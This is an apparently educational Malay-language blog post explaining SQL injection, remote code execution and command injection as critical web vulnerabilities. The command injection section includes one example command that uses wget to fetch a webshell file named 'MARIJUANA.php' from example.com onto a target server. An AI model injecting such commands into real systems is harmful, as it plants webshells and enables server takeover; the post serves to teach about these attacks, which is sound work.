---
layout: post
title: "Mengejes Web Series: Critical Vulnerability Level"
categories: Mengejes-Web-Series
permalink: /critical-vulnerability-level-mengejes-web-series
published: true
---

![header](/assets/pictures/Comp_1_1.gif)
### Jenis-jenis web (OWASP Top 10) vulnerability
 Setiap vulnerability berlaku dalam pelbagai senario serta kesan yang berbeza. Oleh itu, setiap vulnerability yang wujud akan dikelaskan dalam 4 peringkat iaitu low, medium, high dan critical.

---
![sqli](/assets/pictures/SQL-injection-attack-example.png)
### SQL Injection
 SQL Injection merupakan web vulnerability yang membolehkan hackers untuk mengganggu queries atau pertanyaan yang dibuat oleh web application ke pangkalan data. Secara umumnya, segala data yang dipaparkan pada frontend atau halaman web diambil dari backend iaitu pangkalan data sesebuah website. Namun, hacker dapat memanipulasi proses penghantaran dan penerimaan queries untuk melihat data sensitif yang susah untuk kita dapatkan. Antara data yang mereka boleh dapatkan termasuk maklumat pengguna seperti username,password,telephone no, address dan lain-lain.

---

![RCE](/assets/pictures/RCE.png)
### Remote Code Execution
 Remote Code Execution (RCE) merupakan vulnerability yang sangat bahaya kepada sesebuah web application kerana hacker dapat memasukkan malicious code ke dalam server. Malicious code tersebut dimasukkan melalui titik input yang mereka jumpai seperti ‘kotak search’. Setelah itu server akan execute command yang diarahkan oleh hacker tanpa sengaja. Lantas, mereka dapat mengakses masuk ke dalam server. Secara umumnya, RCE berlaku disebabkan oleh source code, library files, dan plugins yang diambil dari pihak ketiga. Dalam kata lain, source code yang diambil itu tidak dibersihkan atau protected.

---

![Command-Injection](/assets/pictures/command%20injection.png)
### Command Injection
 Command injection dan RCE mempunyai persamaan dalam mendapatkan output dari server. Namun, kedua-dua vulnerability tersebut adalah berbeza mengikut senario. Command injection juga dikenali sebagai shell injection dan os command injection. Command injection merupakan vulnerability yang membolehkan hacker untuk memasukkan arbitrary command ke atas host operating system.

 ```bash
 Wget --no-check-certificate --content-disposition https://example.com/MARIJUANA.php
 ```

 ke atas host operating system melalui titik input untuk memasukkan webshell ke dalam server. Tambahan lagi, server akan memberi output kepada hacker dengan menganggap hacker tersebut merupakan webmaster.